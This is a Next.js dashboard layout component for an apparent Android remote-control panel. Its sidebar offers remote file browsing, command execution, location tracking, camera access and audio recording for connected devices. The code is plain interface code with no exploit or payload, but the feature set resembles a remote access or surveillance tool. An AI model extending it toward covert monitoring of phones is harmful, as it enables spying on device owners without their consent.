'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { Button } from '@/components/ui/button';
import { Sheet, SheetContent, SheetTrigger } from '@/components/ui/sheet';
import { Badge } from '@/components/ui/badge';
import { 
  Menu, 
  Smartphone, 
  Monitor, 
  FileText, 
  Terminal, 
  MapPin, 
  Camera, 
  Mic, 
  Settings,
  LogOut,
  Wifi,
  WifiOff,
  Users
} from 'lucide-react';
import { useAdminSocket } from '@/hooks/useSocket';

interface DashboardLayoutProps {
  children: React.ReactNode;
}

export default function DashboardLayout({ children }: DashboardLayoutProps) {
  const [adminId, setAdminId] = useState<string | null>(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const router = useRouter();
  
  const { connected, connectedDevices, deviceEvents } = useAdminSocket(adminId || '');

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    const storedAdminId = localStorage.getItem('admin_id');
    
    if (!token || !storedAdminId) {
      router.push('/');
      return;
    }
    
    setAdminId(storedAdminId);
  }, [router]);

  const handleLogout = () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_id');
    router.push('/');
  };

  const navigationItems = [
    {
      title: 'Dashboard',
      href: '/dashboard',
      icon: Monitor,
      description: 'Overview of all connected devices'
    },
    {
      title: 'Devices',
      href: '/dashboard/devices',
      icon: Smartphone,
      description: 'Manage connected Android devices'
    },
    {
      title: 'File Manager',
      href: '/dashboard/files',
      icon: FileText,
      description: 'Browse and manage device files'
    },
    {
      title: 'Terminal',
      href: '/dashboard/terminal',
      icon: Terminal,
      description: 'Execute commands remotely'
    },
    {
      title: 'Location',
      href: '/dashboard/location',
      icon: MapPin,
      description: 'Track device locations'
    },
    {
      title: 'Camera',
      href: '/dashboard/camera',
      icon: Camera,
      description: 'Remote camera access'
    },
    {
      title: 'Audio',
      href: '/dashboard/audio',
      icon: Mic,
      description: 'Audio recording controls'
    },
    {
      title: 'Settings',
      href: '/dashboard/settings',
      icon: Settings,
      description: 'Application settings'
    }
  ];

  if (!adminId) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-purple-600"></div>
      </div>
    );
  }

  const SidebarContent = () => (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="p-6 border-b border-slate-200">
        <div className="flex items-center space-x-3">
          <div className="w-10 h-10 bg-purple-600 rounded-xl flex items-center justify-center">
            <Smartphone className="w-6 h-6 text-white" />
          </div>
          <div>
            <h2 className="font-bold text-lg text-slate-900">Remote Control</h2>
            <p className="text-sm text-slate-500">Android Dashboard</p>
          </div>
        </div>
      </div>

      {/* Connection Status */}
      <div className="p-4 bg-slate-50 border-b border-slate-200">
        <div className="flex items-center justify-between mb-2">
          <span className="text-sm font-medium text-slate-700">Connection Status</span>
          {connected ? (
            <Badge className="bg-green-100 text-green-700 hover:bg-green-100">
              <Wifi className="w-3 h-3 mr-1" />
              Connected
            </Badge>
          ) : (
            <Badge variant="destructive">
              <WifiOff className="w-3 h-3 mr-1" />
              Disconnected
            </Badge>
          )}
        </div>
        <div className="flex items-center justify-between text-sm">
          <span className="text-slate-600">Active Devices</span>
          <Badge variant="outline">
            <Users className="w-3 h-3 mr-1" />
            {connectedDevices.length}
          </Badge>
        </div>
      </div>

      {/* Navigation */}
      <nav className="flex-1 p-4 space-y-2">
        {navigationItems.map((item) => {
          const Icon = item.icon;
          return (
            <Link
              key={item.href}
              href={item.href}
              onClick={() => setSidebarOpen(false)}
              className="flex items-center space-x-3 px-3 py-2 rounded-lg text-slate-700 hover:bg-slate-100 hover:text-slate-900 transition-colors group"
            >
              <Icon className="w-5 h-5" />
              <div className="flex-1">
                <div className="font-medium">{item.title}</div>
                <div className="text-xs text-slate-500 group-hover:text-slate-600">
                  {item.description}
                </div>
              </div>
            </Link>
          );
        })}
      </nav>

      {/* Recent Activity */}
      <div className="p-4 border-t border-slate-200">
        <h3 className="text-sm font-medium text-slate-700 mb-3">Recent Activity</h3>
        <div className="space-y-2">
          {deviceEvents.slice(0, 3).map((event, index) => (
            <div key={index} className="text-xs text-slate-600 bg-slate-50 p-2 rounded">
              <div className="font-medium">Device {event.deviceId}</div>
              <div>{event.type} • {new Date(event.timestamp).toLocaleTimeString()}</div>
            </div>
          ))}
          {deviceEvents.length === 0 && (
            <div className="text-xs text-slate-500 italic">No recent activity</div>
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="p-4 border-t border-slate-200">
        <Button
          variant="outline"
          className="w-full justify-start text-slate-700 hover:text-red-700 hover:bg-red-50"
          onClick={handleLogout}
        >
          <LogOut className="w-4 h-4 mr-2" />
          Sign Out
        </Button>
      </div>
    </div>
  );

  return (
    <div className="flex h-screen bg-slate-50">
      {/* Desktop Sidebar */}
      <div className="hidden lg:flex lg:flex-col lg:w-80 bg-white shadow-sm border-r border-slate-200">
        <SidebarContent />
      </div>

      {/* Mobile Sidebar */}
      <Sheet open={sidebarOpen} onOpenChange={setSidebarOpen}>
        <SheetContent side="left" className="p-0 w-80">
          <SidebarContent />
        </SheetContent>
      </Sheet>

      {/* Main Content */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Mobile Header */}
        <div className="lg:hidden flex items-center justify-between p-4 bg-white border-b border-slate-200">
          <Sheet>
            <SheetTrigger asChild>
              <Button variant="outline" size="sm">
                <Menu className="w-4 h-4" />
              </Button>
            </SheetTrigger>
          </Sheet>
          
          <div className="flex items-center space-x-2">
            <h1 className="font-semibold text-slate-900">Dashboard</h1>
            {connected ? (
              <Badge className="bg-green-100 text-green-700">
                <Wifi className="w-3 h-3 mr-1" />
                {connectedDevices.length}
              </Badge>
            ) : (
              <Badge variant="destructive">
                <WifiOff className="w-3 h-3" />
              </Badge>
            )}
          </div>
        </div>

        {/* Page Content */}
        <main className="flex-1 overflow-auto">
          {children}
        </main>
      </div>
    </div>
  );
}